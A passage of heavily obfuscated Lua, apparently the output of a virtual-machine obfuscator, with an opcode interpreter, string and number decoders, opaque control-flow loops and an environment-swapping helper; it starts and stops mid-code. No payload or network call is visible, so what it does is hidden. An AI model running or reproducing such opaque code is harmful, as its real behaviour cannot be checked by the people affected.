s=933;local v=159;local w=7668;local x=424;local y=31026;local be=677;local bf=245;local bg=1800;local bh=797;local bi=3;local bj=900;local bk=714;local bs=7645;local bw=223;local by=1250;local bz=625;local ca=32326;local cc=785;local ce=166;local cs=2;local ct=1;local cu=0;local cv,cw=cu,ct;local a=(function(cx,cy,cz,da)cy(da(cy,cx,cy,cy and da),cx(cx,cx,cz,da),da((da and cy),da,(cy and cy),cz),cx(cz,da,da,cy))end)(function(cx,cy,cz,da)if(cv>ce)then local ce=cu while true do ce=(ce+ct)if(ce<cs)then return da else break end end end cv=(cv+ct)cw=(cw+cc)%ca if((cw%by)<bz or(cw%by)==bz)then local by=cu while true do by=(by+ct)if by>ct then break else return cz(cz(cz,cy,cx,cz),cy(cy,cx and da,(cy and cx),da),cy(cz,cy,(da and cx),cy),cz(cz,cx,cx,da))end end else local by=cu while true do by=(by+ct)if not(by~=ct)then return cz else break end end end return cy end,function(by,bz,ca,cc)if(cv>bw)then local bw=cu while true do bw=(bw+ct)if(bw>ct)then break else return by end end end cv=(cv+ct)cw=((cw*bk)%bs)if((cw%bg)==bj or(cw%bg)>bj)then local bg=cu while true do bg=(bg+ct)if(bg>cs or bg==cs)then if(bg<bi)then return cc else break end else cw=((cw-bh)%w)end end else local w=cu while true do w=(w+ct)if w>ct then break else return by(cc(cc,by and ca,bz,bz),by(bz,cc,ca,by),ca(by,by,by,bz and cc),cc(bz,cc,bz and bz,by))end end end return ca(ca(bz,bz,by,by and by),cc(by,(cc and bz),ca,cc),bz(ca,cc,cc,by),by(by and ca,cc,ca,bz))end,function(w,bg,bh,bi)if cv>bf then local bf=cu while true do bf=(bf+ct)if bf>ct then break else return w end end end cv=(cv+ct)cw=((cw-be)%y)if((cw%x)==p or(cw%x)<p)then local p=cu while true do p=p+ct if not(p~=cs)then break else return bh end end else local p=cu while true do p=(p+ct)if not(p~=cs)then break else return bh(bh(bg,(bh and bh),w,bh),bg(bi,bh,bi,bi),bg(bh,bg,(bi and bh),w),bh(bi and bi,(w and w),bg,bi))end end end return bg(bh(bg,bh,bi,bh),w(bi,bg,bg and bg,bg),bh(w,bi,bh,w),bg(w,w,bh,bg)and bh(bi,(bg and w),bg,w))end,function(p,w,x,y)if(cv>v)then local v=cu while true do v=v+ct if not(v~=ct)then return y else break end end end cv=(cv+ct)cw=(cw*s)%q if((cw%c)==d or(cw%c)>d)then local c=cu while true do c=c+ct if(c==ct or c<ct)then cw=((cw+b)%a)else if c>cs then break else return p end end end else local a=cu while true do a=a+ct if not(a~=ct)then return x(y(p,x,p,w),x(x,w and y,p,(y and w)),(x(w,x,p,p)and w(w,y,w,p)),x(p,(w and x),(p and y),p))else break end end end return w(x(y,w,x,y),x(w,y,y,p and x),(y(x,p,y,(w and p))and w(y,(y and x),p,p)),x(p,y,w,p))end)return cw;end)());else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if a>0 then if(b==0 and c==0)then return 0;end;else b,c=cf(),cf()end else if a~=3 then d=1 else p=((cd(c,1,20)*(2^32)))+b end end else if a<=5 then if a<5 then q=cd(c,21,31)else s=(((-1)^cd(c,32)))end else if a<=6 then if(not(q~=0))then if((p==0))then return s*0;else q=1;d=0;end;elseif(not(q~=2047))then if(not(p~=0))then return(s*(1/0));else return(s*((0/0)));end;end;else if 7<a then break else return(s*2^(q-1023)*(d+(p/(2^52))))end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if bd<31 then cm=function()local a,b,c=0 while true do if a<=1 then if 1>a then b,c=h(bn,br,br+2)else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=br+2;else if 3==a then return((bv(c,8))+b);else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if 32==bd then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if a<2 then c=83 else d=0 end end else if a<=3 then p={}else if a<5 then while(d<5)do d=(d+1);while(d<479 and(c%1710)<855)do c=((c*70))local q=(d+c)if(((c%9782)<4891))then c=((c*87))while((((d<515))and(c%712<356)))do c=(((c+32)))local q=(d+c)if(((c%11808))>5904)then c=((c-59))local q=44466 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if(v~=1)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end elseif not(((c%4)==0))then c=(c+32)local q=6559 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if(0<v)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end else c=(((c*56)))d=d+1 local q=65972 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if(1>v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=d+1;end elseif(not((c%4)==0))then c=((c*3))while(d<144 and c%760<380)do c=((c-80))local q=((d+c))if(((c%12168)<6084))then c=(c+80)local q=15921 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if v~=1 then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end elseif not(not(c%4~=0))then c=((c-94))local q=29558 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if not(0~=v)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end else c=((c+11))d=(d+1)local q=52696 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if(v<1)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=d+1;end else c=(((c+53)))d=d+1 while d<707 and c%386<193 do c=(((c-16)))local q=((d+c))if((c%252))>126 then c=(((c-85)))local q=37178 if not p[q]then p[q]=1;local q,s=cn(),g;if not(q~=0)then return g;end;b=j(bn,br,((br+q)-1));br=br+q;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if 0<v then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not((c%4)==0)then c=((c-40))local q=2346 if not p[q]then p[q]=1;end else c=(c*84)d=((d+1))local q=36428 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if 1==p then while true do if(q==0)then return i(h(b))else break end q=(q+1)end else break end end p=p+1 end end);end end;d=(d+1);end end;d=(d+1);end c=((c-385))if((d>40))then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if a==0 then return{...},n("\35",...)else break end a=a+1 end end else if bd~=36 then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if 0<a then q=m({[ch]=b,nil,[ci]=c,nil,[311]=p,[312]=bb,[823]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})else b,c,d,p={},{},{},{}end else if a<=2 then s={}else if 3<a then w=0 else v=175 end end end else if a<=6 then if 6>a then x={}else while(w<7)do w=((w+1));while(((w<734)and v%92<46))do v=(v*42)local d=w+v if((((v%11336))>5668))then v=((v+6))while(w<966)and(v%34<17)do v=(v+11)local d=(w+v)if((v%19128)>=9564)then v=(v+49)local d=6346 if not x[d]then x[d]=1;s[cf()]=nil;end elseif(v%4~=0)then v=((v+37))local d=50617 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not((j~=3)))then s[d]=nil;elseif((j==2))then s[d]=((cg()~=0));elseif(not(j~=0))then s[d]=ck();elseif(not(not(j==1)))then s[d]=co();end;end;q[cj]=s;end else v=(v-3)w=(w+1)local d=33993 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end elseif not(not((v%4)~=0))then v=((v*57))while((w<368 and v%1590<795))do v=(((v*14)))local d=(w+v)if((((v%17980))>8990))then v=(((v-60)))local d=8505 if not x[d]then x[d]=1;s[cf()]=nil;end elseif(v%4~=0)then v=((v+93))local d=67922 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v*15))w=(w+1)local d=1891 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end else v=(((v+11)))w=w+1 while((w<766 and v%822<411))do v=(((v-11)))local d=(w+v)if((v%8062)<4031)then v=((v-71))local d=12079 if not x[d]then x[d]=1;s[cf()]=nil;end elseif(v%4~=0)then v=(v*51)local d=12892 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(v-53)w=w+1 local d=54764 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=w+1;end end;w=(w+1);end v=(v*910)if w>30 then break;end;end;end else if a<=7 then q[568]=cg();else if a==8 then v=448 else w=0 end end end end else if a<=14 then if a<=11 then if 11~=a then x={}else while(w<2)do w=(w+1);while(w<97 and(((v%22)<11)))do v=((v-16))local d=w+v if((((v%9254))<4627 or((v%9254))==4627))then v=((v*74))while((w<149 and(v%1650<825)))do v=((v*43))local d=((w+v))if(((v%5682)>2841))then v=((v+12))local d=52045 if not x[d]then x[d]=1;local d=1;local j=2;local p=3;local y=4;for y=1,cf()do local bb=cg();local be=cd(bb,d,d);if(be==0)then local bb,be,bf=cd(bb,j,p),cd(bb,4,6),m({[686]=cm(),[125]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(bb,j,p);end,})if(bb==0)or(bb==d)then bf[392]=cf();if(not(not(not(bb~=0))))then bf[54]=cf();end;elseif((not(bb~=j))or((bb==p)))then bf[392]=(cf()-(e));if(not((bb~=p)))then bf[54]=cm();end;end;if((not(cd(be,d,d)~=d)))then bf[125]=s[bf[125]];end;if(not(not(cd(be,j,j)==d)))then bf[392]=s[bf[392]];end;if((not(not(cd(be,p,p)==d))))then bf[54]=s[bf[54]];end;b[y]=bf;end;end;end elseif not(not((v%4)~=0))then v=(v-51)local b=63633 if not x[b]then x[b]=1;end else v=((v*48))w=((w+1))local b=2910 if not x[b]then x[b]=1;end end;w=(w+1);end elseif not((v%4)==0)then v=(v+7)while((w<676)and((v%216)<108))do v=((v-8))local b=(w+v)if((v%14044)<7022)then v=(((v-14)))local b=64750 if not x[b]then x[b]=1;end elseif not(not(((v%4))~=0))then v=((v*7))local b=45975 if not x[b]then x[b]=1;end else v=(v-39)w=(w+1)local b=99786 if not x[b]then x[b]=1;end end;w=w+1;end else v=((v+79))w=((w+1))while w<437 and v%1602<801 do v=((v+37))local b=(w+v)if(v%17536)<8768 then v=(((v+89)))local b=10157 if not x[b]then x[b]=1;end elseif(not((v%4)==0))then v=(((v-32)))local b=26236 if not x[b]then x[b]=1;end else v=(((v*26)))w=(w+1)local b=79479 if not x[b]then x[b]=1;end end;w=(w+1);end end;w=((w+1));end v=((v-423))if w>22 then break;end;end;end else if a<=12 then for b=1,cf()do c[b-1]=cr();end;else if 13==a then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[125],b[392],b[54]if not(not(bp(c)==f))then c=z(c,cl,function(j,p,p)local p,s=0 while true do if p<=0 then s=0 else if 2>p then while true do if(0<s)then break else return i(bu(h(j),cb))end s=s+1 end else break end end p=p+1 end end)b[125]=c end if(((bp(d)==f)))then d=z(d,cl,function(c,j,j)local j,p=0 while true do if j<=0 then p=0 else if 1==j then while true do if(0==p)then return i(bu(h(c),cb))else break end p=(p+1)end else break end end j=j+1 end end)b[392]=d end if not(((bp(e)~=f)))then e=z(e,cl,function(c,d,d,d)local d,j=0 while true do if d<=0 then j=0 else if d==1 then while true do if(0==j)then return i(bu(h(c),cb))else break end j=j+1 end else break end end d=d+1 end end)b[54]=e end;end;q[cj]=nil;end;else v=898 end end end else if a<=16 then if 15==a then w=0 else x={}end else if a<=17 then while((w<7))do w=(w+1);while w<713 and(v%572<286)do v=(v*27)local b=(w+v)if((((v%15962)))>7981)then v=((v-1))while((w<461)and(v%88<44))do v=((v-92))local b=(w+v)if(((v%19278)==9639 or(v%19278)<9639))then v=((v+16))local b=25062 if not x[b]then x[b]=1;return q end elseif not(((v%4)==0))then v=((v*34))local b=14085 if not x[b]then x[b]=1;return q end else v=(((v-50)))w=((w+1))local b=84836 if not x[b]then x[b]=1;return q end end;w=w+1;end elseif(v%4~=0)then v=(((v+55)))while(((w<908)and((v%610<305))))do v=(v-16)local b=((w+v))if((v%10866)<5433)then v=(((v+8)))local b=32427 if not x[b]then x[b]=1;q[823]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if 1==b then while true do if(c==2 or c<2)then if c<=0 then d=n(1,...)else if 2>c then e=({...})else do for d=0,#e do if not(not(bp(e[d])==bq))then for i,i in o,e[d]do if not(not(bp(i)==bp(g)))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c<=3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if 2>i then while true do if j<=1 then if 0<j then for s=0,#bo do if ba(d,bo[s])then return bm(f);end end else p=u(d)end else if(j~=3)then return false else break end end j=j+1 end else break end end i=i+1 end end else if 4<c then break else for d=0,#e do if not(bp(e[d])~=bq)then return h(e[d])end end end end end c=(c+1)end else break end end b=b+1 end end end elseif not(not((v%4)~=0))then v=(v+88)local b=92442 if not x[b]then x[b]=1;return q end else v=((v*94))w=(w+1)local b=68262 if not x[b]then x[b]=1;return q end end;w=((w+1));end else v=(v+83)w=w+1 while(w<483 and v%246<123)do v=(((v*39)))local b=((w+v))if(((((v%11928))>5964)or(((v%11928))==5964)))then v=((v*75))local b=92487 if not x[b]then x[b]=1;return q end elseif((v%4~=0))then v=(((v+42)))local b=98872 if not x[b]then x[b]=1;return q end else v=(((v*67)))w=(w+1)local b=67998 if not x[b]then x[b]=1;return q end end;w=(w+1);end end;w=(w+1);end v=((v-713))if(w>66)then break;end;end;else if 18==a then return q;else break end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[ch];local f=c[823];local h=n(2,...);local i=c[568];local j=c[312];local o=n(3,...);local c=c[311];local c=bt[ba(bx,j)];return function(...)local j,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=i)then q[x-i]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-i+1),nil,nil,{};while true do y=e[n];z=y[686];if z<=189 then if z<=94 then if z<=46 then if z<=22 then if 10>=z then if 4>=z then if 1>=z then if(z>0)then w[y[125]][y[392]]=y[54];else local ba=w[y[54]];if ba then n=n+1;else w[y[125]]=ba;n=y[392];end;end;elseif 2>=z then local ba=y[125]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[54]do bc=bc+1;w[bd]=bb[bc];end elseif 4~=z then a(c,f);else local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end end;elseif 7>=z then if(5==z or 5>z)then local ba=0 while true do if ba<=18 then if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then n=n+1;else w[y[125]]=o[y[392]];end else if ba==2 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if ba<=5 then if 4==ba then n=n+1;else y=e[n];end else if ba<=6 then w[y[125]]=o[y[392]];else if ba<8 then n=n+1;else y=e[n];end end end end else if ba<=13 then if ba<=10 then if ba==9 then w[y[125]]=o[y[392]];else n=n+1;end else if ba<=11 then y=e[n];else if 13~=ba then w[y[125]]=o[y[392]];else n=n+1;end end end else if ba<=15 then if ba<15 then y=e[n];else w[y[125]]=o[y[392]];end else if ba<=16 then n=n+1;else if 17<ba then w[y[125]]=o[y[392]];else y=e[n];end end end end end else if ba<=27 then if ba<=22 then if ba<=20 then if ba<20 then n=n+1;else y=e[n];end else if 21==ba then w[y[125]]=o[y[392]];else n=n+1;end end else if ba<=24 then if 23<ba then w[y[125]]=o[y[392]];else y=e[n];end else if ba<=25 then n=n+1;else if ba==26 then y=e[n];else w[y[125]]=o[y[392]];end end end end else if ba<=32 then if ba<=29 then if ba==28 then n=n+1;else y=e[n];end else if ba<=30 then w[y[125]]={};else if 32~=ba then n=n+1;else y=e[n];end end end else if ba<=34 then if 33<ba then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if ba<=35 then y=e[n];else if ba==36 then if not w[y[125]]then n=n+1;else n=y[392];end;else break end end end end end end ba=ba+1 end elseif z<7 then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[125]]=w[y[392]][y[54]];end else if ba~=3 then n=n+1;else y=e[n];end end else if ba<=5 then if ba<5 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end else if ba<=6 then y=e[n];else if 8>ba then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba~=10 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end else if ba<=11 then n=n+1;else if ba~=13 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end else if ba<=15 then if 15>ba then n=n+1;else y=e[n];end else if ba<=16 then bb=y[125]else if 18~=ba then w[bb]=w[bb](w[bb+1])else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba==1 then w[y[125]]=w[y[392]][y[54]];else n=n+1;end end else if ba<=4 then if 3==ba then y=e[n];else w[y[125]]=w[y[392]][y[54]];end else if 6~=ba then n=n+1;else y=e[n];end end end else if ba<=10 then if ba<=8 then if 7<ba then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if ba<10 then y=e[n];else w[y[125]]=w[y[392]]*y[54];end end else if ba<=12 then if ba==11 then n=n+1;else y=e[n];end else if 13<ba then n=n+1;else w[y[125]]=w[y[392]]+w[y[54]];end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if ba<16 then y=e[n];else w[y[125]]=o[y[392]];end else if ba~=18 then n=n+1;else y=e[n];end end else if ba<=20 then if ba>19 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if 21==ba then y=e[n];else w[y[125]]=w[y[392]];end end end else if ba<=26 then if ba<=24 then if ba>23 then y=e[n];else n=n+1;end else if ba~=26 then w[y[125]]=w[y[392]]+w[y[54]];else n=n+1;end end else if ba<=28 then if 28~=ba then y=e[n];else bb=y[125]end else if ba>29 then break else w[bb]=w[bb](r(w,bb+1,y[392]))end end end end end ba=ba+1 end end;elseif 8>=z then local ba;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=false;n=n+1;y=e[n];ba=y[125]w[ba](w[ba+1])elseif z<10 then w[y[125]]=false;n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];if(w[y[125]]~=y[54])then n=n+1;else n=y[392];end;else h[y[392]]=w[y[125]];end;elseif z<=16 then if 13>=z then if(z<11 or z==11)then local ba,bb=0 while true do if ba<=7 then if(ba==3 or ba<3)then if(ba<=1)then if 1>ba then bb=nil else w[y[125]]=h[y[392]];end else if 3~=ba then n=(n+1);else y=e[n];end end else if(ba<=5)then if(5~=ba)then w[y[125]]=y[392];else n=n+1;end else if not(ba~=6)then y=e[n];else w[y[125]]=y[392];end end end else if(ba==11 or ba<11)then if(ba<9 or ba==9)then if(ba<9)then n=(n+1);else y=e[n];end else if(ba>10)then n=n+1;else w[y[125]]=y[392];end end else if(ba<=13)then if not(ba~=12)then y=e[n];else bb=y[125]end else if(ba<15)then w[bb]=w[bb](r(w,(bb+1),y[392]))else break end end end end ba=ba+1 end elseif 13>z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba==3 then w[y[125]]=h[y[392]];else n=n+1;end end end else if ba<=6 then if 6>ba then y=e[n];else w[y[125]]=h[y[392]];end else if ba<=7 then n=n+1;else if ba<9 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=e[n];end else if ba<=12 then w[y[125]]=w[y[392]][w[y[54]]];else if ba~=14 then n=n+1;else y=e[n];end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[125]end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[54]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else w[y[125]]=o[y[392]];end else if ba<=2 then n=n+1;else if 3<ba then w[y[125]]=w[y[392]][y[54]];else y=e[n];end end end else if ba<=7 then if ba<=5 then n=n+1;else if 6==ba then y=e[n];else w[y[125]]=y[392];end end else if ba<=8 then n=n+1;else if ba<10 then y=e[n];else w[y[125]]=y[392];end end end end else if ba<=15 then if ba<=12 then if 11==ba then n=n+1;else y=e[n];end else if ba<=13 then w[y[125]]=y[392];else if 15>ba then n=n+1;else y=e[n];end end end else if ba<=18 then if ba<=16 then w[y[125]]=y[392];else if ba<18 then n=n+1;else y=e[n];end end else if ba<=19 then bb=y[125]else if 21~=ba then w[bb]=w[bb](r(w,bb+1,y[392]))else break end end end end end ba=ba+1 end end;elseif(z<14 or z==14)then local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba~=2 then w[y[125]]={};else n=n+1;end end else if ba<=4 then if 3==ba then y=e[n];else w[y[125]]=h[y[392]];end else if ba~=6 then n=n+1;else y=e[n];end end end else if ba<=9 then if ba<=7 then w[y[125]]=w[y[392]][y[54]];else if 9>ba then n=n+1;else y=e[n];end end else if ba<=11 then if ba==10 then w[y[125]][y[392]]=w[y[54]];else n=n+1;end else if ba>12 then w[y[125]]=o[y[392]];else y=e[n];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then n=n+1;else if 15<ba then w[y[125]]=w[y[392]][y[54]];else y=e[n];end end else if ba<=18 then if 17==ba then n=n+1;else y=e[n];end else if 20~=ba then w[y[125]]=o[y[392]];else n=n+1;end end end else if ba<=23 then if ba<=21 then y=e[n];else if ba>22 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end end else if ba<=25 then if ba<25 then y=e[n];else bb=y[125]end else if ba~=27 then w[bb]=w[bb]()else break end end end end end ba=ba+1 end elseif not(15~=z)then local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 1==ba then w[y[125]]={};else n=n+1;end end else if ba<=4 then if ba<4 then y=e[n];else w[y[125]]=h[y[392]];end else if ba<6 then n=n+1;else y=e[n];end end end else if ba<=9 then if ba<=7 then w[y[125]]=w[y[392]][y[54]];else if 8==ba then n=n+1;else y=e[n];end end else if ba<=11 then if ba>10 then n=n+1;else w[y[125]][y[392]]=w[y[54]];end else if 13~=ba then y=e[n];else w[y[125]]=o[y[392]];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then n=n+1;else if ba<16 then y=e[n];else w[y[125]]=w[y[392]][y[54]];end end else if ba<=18 then if ba>17 then y=e[n];else n=n+1;end else if ba>19 then n=n+1;else w[y[125]]=o[y[392]];end end end else if ba<=23 then if ba<=21 then y=e[n];else if ba>22 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end end else if ba<=25 then if 24==ba then y=e[n];else bb=y[125]end else if 27~=ba then w[bb]=w[bb]()else break end end end end end ba=ba+1 end else w[y[125]]=o[y[392]];end;elseif 19>=z then if 17>=z then local ba;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))elseif 18<z then local ba=y[125]local bb,bc=j(w[ba](r(w,ba+1,y[392])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];if(w[y[125]]~=y[54])then n=n+1;else n=y[392];end;end;elseif 20>=z then local ba;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];w[y[125]]=y[392];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))elseif 22~=z then local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end else if(w[y[125]]<=w[y[54]])then n=y[392];else n=n+1;end;end;elseif z<=34 then if z<=28 then if z<=25 then if 23>=z then w[y[125]][y[392]]=y[54];n=n+1;y=e[n];w[y[125]]={};n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];elseif z~=25 then w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if(w[y[125]]~=w[y[54]])then n=n+1;else n=y[392];end;else w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]][y[392]]=w[y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];if(w[y[125]]~=w[y[54]])then n=n+1;else n=y[392];end;end;elseif 26>=z then local ba=y[125];p=ba+x-1;for bb=ba,p do local ba=q[bb-ba];w[bb]=ba;end;elseif z==27 then local ba;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](r(w,ba+1,y[392]))else local ba=y[125]w[ba]=w[ba](r(w,ba+1,p))end;elseif z<=31 then if z<=29 then w[y[125]]=w[y[392]][w[y[54]]];elseif 31>z then local ba=w[y[125]]+y[54];w[y[125]]=ba;if(ba<=w[y[125]+1])then n=y[392];end;else n=y[392];end;elseif z<=32 then local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end elseif z>33 then local ba;w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];ba=y[125]w[ba]=w[ba](w[ba+1])else local ba;local bb;local bc;w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=h[y[392]];n=n+1;y=e[n];w[y[125]]=w[y[392]][y[54]];n=n+1;y=e[n];w[y[125]]=w[y[392]][w[y[54]]];n=n+1;y=e[n];bc=y[125]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[54]do ba=ba+1;w[bd]=bb[ba];end end;elseif 40>=z then if 37>=z then if z<=35 then local ba=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then w={};else if 1<ba then n=n+1;else for bb=0,u,1 do if bb<i then w[bb]=s[bb+1];else break;end;end;end end else if ba<=4 then if ba>3 then w[y[125]]=h[y[392]];else y=e[n];end else if 5==ba then n=n+1;else y=e[n];end end end else if ba<=10 then if ba<=8 then if ba>7 then n=n+1;else w[y[125]]=w[y[392]][y[54]];end else if ba~=10 then y=e[n];else w[y[125]]=h[y[392]];end end else if ba<=12 then if 11<ba then y=e[n];else n=n+1;end else if 14>ba then w[y[125]]={};else n=n+1;end end end end else if ba<=21 then if ba<=17 then if ba<=15 then 